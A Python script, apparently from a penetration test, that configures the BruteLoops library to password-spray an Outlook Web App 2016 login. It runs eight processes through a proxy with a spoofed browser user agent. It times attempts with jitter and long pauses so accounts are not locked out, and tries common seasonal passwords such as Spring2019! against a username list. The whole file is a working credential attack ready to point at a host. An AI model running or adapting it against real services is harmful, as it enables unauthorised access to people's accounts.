#!/usr/bin/env python3

from BruteLoops.jitter import Jitter
from BruteLoops.brute import Horizontal
from BruteLoops.config import Config
from BruteLoops.logging import GENERAL_EVENTS,logging
from ***REMOVED*** import OWA2016

# ========================
# USER INTERFACE SHORTCUTS
# ========================
# Primarily to handle KeyboardInterrupts.

def get_user_input(m):
    '''
    Simple input loop expecting either a ```y``` or ```n``` response.
    '''

    uinput = None
    while uinput != 'y' and uinput != 'n':
        uinput = input(m)

    return uinput

def handle_keyboard_interrupt(brute,exception):

    print()
    print('CTRL+C Captured\n')
    resp = get_user_input('Kill brute force?(y/n): ')

    if resp == 'y':
        print('Kill request received')
        print('Monitoring final processes completion')
        bf.shutdown()
        print('Exiting')
        exit()
    else:
        return 1

# ============================
# ATTACK/MODULE CONFIGURATIONS
# ============================
# Below is a fake authentication function. Note that it's configured to
# receive a username and password argument. This is precisely how brute_loops
# will make the authentication callback.
def fake(username, password, *args, **kwargs):
    'Fake authentication function to serve as a basic example'

    if username == 'administrator' and password == 'P@ssw0rd':
        return [1,username,password]
    else:
        return [0,username,password]

config = Config()
proxies = {'https':'http://***REMOVED***:31280'}
headers={'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36'}
config.authentication_callback = OWA2016('***REMOVED***
        proxies=proxies,
        headers=headers)
                                     
# ============================
# AUTHENTICATION CONFIGURATION
# ============================
config.process_count = 8      
config.max_auth_tries = 1    
config.stop_on_valid = True 

# ====================
# JITTER CONFIGURATION
# ====================
config.authentication_jitter = Jitter(min='20s',max='25s') 
config.max_auth_jitter = Jitter(min='45m',max='50m')     

# ====================
# OUTPUT CONFIGURATION
# ====================
config.db_file = '***REMOVED***'    

# LOGGING LEVELS
config.log_valid = True             
config.log_invalid = True          
config.log_general = True         

# LOG DESTINATIONS
config.log_stdout = True         
config.log_file = '***REMOVED***.txt'

# ===============================
# EXCEPTION HANDLER CONFIGURATION
# ===============================
config.exception_handlers={KeyboardInterrupt:handle_keyboard_interrupt}

# ==========================
# VALIDATE THE CONFIGURATION
# ==========================

# Always validate the configuration.
config.validate()

logger = logging.getLogger('brute_logger')

try:

    logger.log(GENERAL_EVENTS,'Initializing attack')
    bf = Horizontal(config)
    bf.launch(
        usernames='fl_ln.final',
        passwords=['Password1','Password#1','Password1!','Password123',
            'Spring2019!','Summer2019!','Winter2018!','***REMOVED***','***REMOVED***']
    )
    logger.log(GENERAL_EVENTS,'Attack complete')
    
except Exception as e:

    print()
    print('Unhandled exception occurred.\n')
    print(e)
    print(e.with_traceback())
    print(e.__traceback__.__dir__())
    print(e.__traceback__.tb_lineno)
    print()
    print()
